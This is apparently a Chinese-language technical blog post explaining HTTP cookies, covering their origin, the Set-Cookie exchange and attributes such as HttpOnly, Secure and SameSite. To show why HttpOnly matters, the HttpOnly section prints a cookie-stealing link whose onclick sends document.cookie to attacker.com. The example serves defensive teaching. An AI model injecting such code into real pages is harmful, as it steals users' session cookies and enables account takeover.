---
title: HTTP Cookies
subtitle: A sweet biscuit.
description: http,cookie
date: 2019-06-30
layout: default
category: 技术
---

### Cookie定义

[HTTP cookie](https://www.wikiwand.com/en/HTTP_cookie)技术可以把网站服务器发送给浏览器的特定数据都存在客户端的硬盘上，目的是把**无状态的HTTP请求(stateless)变成有状态的HTTP请求(stateful)**。为什么叫cookie呢？因为它的和[magic cookie](https://www.wikiwand.com/en/Magic_cookie)很类似的原理，magic cookie用于描述**程序接收到数据并把数据原封不动的返回去的一种行为**。1994年网景(netscape)公司的程序员开发一个在线购物应用，设计购物车时，不想把这些数据都存在服务器端，而是直接存在用户的电脑上，减轻服务端的储存压力，不过现代版的购物车通常都是储存在服务器(Cache/数据库)中，cookie可只记录购物车的唯一标识符，而不是直接记录具体的商品。

### Cookie流程及结构

大部分web网站都会使用到cookie，使用它的基本流程可以概括为3步：

1. 浏览器向服务器请求一个从未请求过的web页面；

   ```http
   GET /index.html HTTP/1.1
   Host: www.example.org
   ...
   ```

2. 服务器返回浏览器此页面，并在返回http包的header中设置set-cookie属性；

   ```http
   HTTP/1.0 200 OK
   Content-type: text/html
   Set-Cookie: theme=light
   Set-Cookie: sessionToken=abc123; Expires=Wed, 09 Jun 2020 10:18:14 GMT
   ...
   ```

   上面示例设置了两个cookies：
   第一个是**theme**，由于没有设置它的**Expires** 或 **Max-Age**属性，所以是个**session cookie**,它会在浏览器关闭时直接被删除掉。
   第二个是**SessionToken**,它有过期时间，所以只会在指定的过期时间后才会被删除(也可手动删除)。

3. 浏览器会在接下来的http请求的header中把以上cookie原样返回给服务器。

   ```http
   GET /spec.html HTTP/1.1
   Host: www.example.org
   Cookie: theme=light; sessionToken=abc123
   …
   ```

   浏览器访问http://www.example.org/spec.html时，会把上一步的cookies设置在header中原样返回给服务器，当然不需要再指定cookie的其它属性，只需要把key-value返回即可。

服务器根据设置的cookies就能知道标识这个客户，**把无状态的HTTP请求变成了有状态的请求。**

可以看看具体的网页端的知乎是如何登录的？

![](/Users/zhongwen/截图存放/zhihu_cookie.png)

下图就是通过chrome调试器中看到的https://www.zhihu.com下登录成功后所有的cookies.其中**z_c0**就是登录成功的凭证，当手动把它删除时后刷新界面，会要求重新登录。

![](/Users/zhongwen/截图存放/session_login.png)

从调试器中可以看出cookies除了key-value结构外，还有一些其它的属性。

1. **Domain**和**Path**,它俩定义了cookie的作用范围，告诉浏览器这些cookie属于那个作用域下，为了保证安全，cookie只能设置当前资源的顶级域或子域，不能设置其它域的cookie，比如：zhihu.com网站不能设置baidu.com域名下的cookie。

2. **Expires**和**Max-Age**，浏览器会在Expires指定的时间点过期时，把对应的cookie删除掉。Max-Age与Expires作用相同，只是指定的是浏览器将在未来多少秒后将cookie删除。

3. **Secure**和**HttpOnly**,这两个属性没有具体的值，如果指定了对应的属性，则表示启用了它。比如：

   ```http
   HTTP/1.0 200 OK
   Set-Cookie: lu=Rg3vHJZnehYLjVg7qi3bZjzg; Expires=Tue, 15 Jan 2020 21:47:38 GMT; Path=/; Domain=.example.com; HttpOnly
   ```

   **HttpOnly**表示这个cookie不能被客户端使用JavaScript读取到，是不公开的cookie。比如你在chrome调试器的console中输入`document.cookie`将得不到标记为**HttpOnly**的字段。

   假如你的网站代码非常不幸地被注入了窃取cookie的代码：

   ```http
   <a href="#" onclick="window.location = 'http://attacker.com/stole.cgi?text=' + escape(document.cookie); return false;">Click here!</a>
   ```

   如果用户点击这个链接，浏览器就会把所有**没有**指定**HttpOnly**的cookies都发给attacker.com。

   **Secure**表示cookie只能通过加密传输，即只能用于HTTPS连接。
   比如你可以看到：知乎cookie里面的登录凭证的**HTTPOnly**和**Secure**都是打开的！

4. **SameSite**属性是chromium特有的。用于允许服务器通过声明特定的cookie应与同一可注册域发起的请求一起发送来减轻跨域攻击[CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))和信息泄漏攻击风险。

#### Reference

* [Where cookie comes from?](https://web.archive.org/web/20031220214905/http://dominopower.com/issues/issue200207/cookie001.html)



